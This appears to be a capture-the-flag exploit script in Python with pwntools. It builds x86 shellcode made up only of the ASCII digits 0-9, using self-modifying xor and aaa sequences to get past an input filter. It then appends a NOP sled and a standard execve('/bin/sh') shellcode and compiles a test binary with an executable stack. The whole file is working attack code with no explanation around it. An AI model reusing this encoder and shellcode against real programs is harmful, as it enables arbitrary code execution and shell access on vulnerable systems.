from pwn import *

'''
# val1, val2, 0x32
0xf7ffda01: 0x83
0xf7ffd604: 0x20 # 0xa3
# val1, val2, 0x35
0xf7ffa501: 0xc8
# val1, val2, 0x39
0xf7ffda0b: 0xbf
0xf7ffd605: 0x06 # 0xb9
'''

prev = 0
base = 0xf7ffa000

gadgets = [
(0xf7ffb000+0x209-base, 0x904, 0x905, 0x901),
]

xors = [None] * 16
for i in range(10):
	for j in range(10):
		xors[i ^ j] = 0x30+i, 0x30+j

def make_gadget(x):
	global prev
	c = x[-1]
	r = ''
	for z in sorted(x[:-1]):
		r += add_4096() * ((z - prev >> 12) & 0xff)
		r += xor_al((prev ^ z) & 0xff)
		r += 'xor dh, [eax]\n'
		prev = z
	r += add_4096() * ((c - z >> 12) & 0xff)
	r += xor_al((c ^ z) & 0xff)
	r += write
	prev = c
	return r

def xor_al(x):
	if x == 0:
		return ''
	assert x < 16
	payload = '''xor al, 0x%x
xor al, 0x%x
''' % (xors[x])
	return payload

def add_4096():
	payload = '''
xor eax, 0x30303732; xor eax, 0x30303838; aaa
'''
	return payload.strip() + '\n'

def add_256():
	payload = '''
	xor al, 0x38; xor al, 0x32; aaa
	'''
	return payload.strip() + '\n'

crash = '.ascii "99"'
write = 'xor [eax], dh'
assembly = '\n'.join(['cmp [eax], bh',
	'xor dh, [eax]', 'xor dh, [esp+esi]', add_256() * 3,
	xor_al(6),
	'xor dh, [eax]',
	xor_al(6),
	'xor dh, [eax]',
	xor_al(4),
	write,
	xor_al(5 ^ 4),
	write,
	xor_al(6 ^ 5),
	write,
	'xor dh, [eax]', # dh = 0x37
	xor_al(13 ^ 6),
	'xor dh, [eax]', # dh = 10
	xor_al(14 ^ 13),
	'xor dh, [eax]', # dh = 0x3f
	xor_al(11 ^ 14),
	write, # [eax] = 0xf
	xor_al(11),
	'xor eax, 0x30303330; xor eax, 0x30303030;',
	add_4096() * 3,
	add_256() * 3,
	'xor dh, [eax]',
	'xor eax, 0x30303838; xor eax, 0x30303432; aaa',
	add_4096() * 12,
	add_256() * 3,
	xor_al(15),
	'xor dh, [eax]',
	xor_al(15),
	write,
	xor_al(1),
	write,
	xor_al(2 ^ 1),
	write,
	xor_al(3 ^ 2),
	write,
	xor_al(15 ^ 2)
	])
# print assembly
prefix = '''
.globl main
.intel_syntax noprefix
main:
jmp b
.data
b:
push offset d-code
push offset code
push 0xf7fd5000
call memcpy
mov eax, 0xf7fd5000
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor ebp, ebp
xor edi, edi
xor esi, esi
int3
push 0x804819d
jmp eax
.align 4096
code:
'''
code = asm(assembly)
code = code.ljust(0x300, '0')
code += asm('''
	.ascii "0000632"
	xor al, 0x30
	xor al, 0x33
	.ascii "04857"
	''')
open('a.s', 'wb').write(prefix + '.ascii "' + code + '"\nd:\n')
if not all(x in '0123456789' for x in code):
	exit()
code = code.ljust(4096, '0')
sh = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
sh = '\x90' * 100 + sh
open('sh', 'wb').write(sh)
sys.stdout.write(code + sh)
import os
os.system('gcc a.s -o a -m32 -z execstack')
exit()





